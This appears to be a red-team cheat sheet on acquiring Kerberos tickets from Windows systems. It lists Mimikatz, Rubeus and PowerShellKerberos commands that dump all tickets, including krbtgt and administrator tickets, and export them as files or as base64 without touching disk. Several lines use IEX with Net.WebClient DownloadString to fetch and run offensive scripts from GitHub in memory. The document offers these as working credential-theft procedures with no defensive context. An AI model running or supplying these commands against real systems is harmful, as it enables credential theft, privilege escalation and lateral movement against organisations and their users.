# Ticket Aquisition

## Requirements

**Unprivileged**

Can extract Kerberos tickets for the current user context

**Privileged (Elevated)**

Can extract all Kerberos tickets on the given system

## Tools

*   Mimikatz

    * Binary: [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)
    * PowerShell: [https://github.com/BC-SECURITY/Empire/blob/main/empire/test/data/module\_source/credentials/Invoke-Mimikatz.ps1](https://github.com/BC-SECURITY/Empire/blob/main/empire/test/data/module\_source/credentials/Invoke-Mimikatz.ps1)


*   Rubeus:

    * Binary: [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
    * PowerShell: [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Rubeus.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Rubeus.ps1)


* PowerShellKerberos:
  * PowerShell: [https://github.com/MzHmO/PowershellKerberos/blob/main/dumper.ps1](https://github.com/MzHmO/PowershellKerberos/blob/main/dumper.ps1)

## Tool Usage

### Mimikatz

{% tabs %}
{% tab title="Binary" %}
```powershell
# Export to file methods

# Export tickets (Preferred Method (More Accurate))
Mimikatz.exe "token::elevate" "sekurlsa::tickets /export"

# Alternative Method
Mimikatz.exe "token::elevate" "kerberos::list /export"
```

{% code overflow="wrap" %}
```powershell
# Export to Base64 without touching disk
Mimikatz.exe "token::elevate" "standard::base64 /out:true" "sekurlsa::tickets /export"
```
{% endcode %}
{% endtab %}

{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# Load into memory
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/test/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
{% endcode %}

```powershell
# Export to file methods

# Export tickets (Preferred Method (More Accurate))
Invoke-Mimikatz -Command '"token::elevate "sekurlsa::tickets /export"'

# Alternative Method
Invoke-Mimikatz -Command '""token::elevate" "kerberos::list /export"'
```

{% code overflow="wrap" %}
```powershell
# Export to Base64 without touching disk
Invoke-Mimikatz -Command '"token::elevate" "standard::base64 /out:true" "sekurlsa::tickets /export"'
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Rubeus

{% tabs %}
{% tab title="Binary" %}
```powershell
# Dump All
.\Rubeus.exe dump /nowrap

# Dump Specified tickets that match a service
.\Rubeus.exe dump /service:krbtgt /nowrap
.\Rubeus.exe dump /service:HTTP /nowrap

# Dump tickets for specified users
.\Rubeus.exe dump /user:administrator /nowrap

# Both
.\Rubeus.exe dump /service:krbtgt /user:administrator /nowrap
```
{% endtab %}

{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# Load into memory
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
```
{% endcode %}

```powershell
# Dump All
Invoke-Rubeus -Command "dump /nowrap"

# Dump Specified tickets that match a service
Invoke-Rubeus -Command "dump /service:krbtgt /nowrap"
Invoke-Rubeus -Command "dump /service:HTTP /nowrap"

# Dump tickets for specified users
Invoke-Rubeus -Command "dump /user:administrator /nowrap"

# Both
Invoke-Rubeus -Command "dump /service:krbtgt /user:administrator /nowrap"
```
{% endtab %}
{% endtabs %}

### PowerShellKerberos

{% tabs %}
{% tab title="PowerShell" %}
<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"># Load into memory and dump
<strong>IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/main/dumper.ps1')
</strong></code></pre>
{% endtab %}
{% endtabs %}



## Ticket Injection

WIP
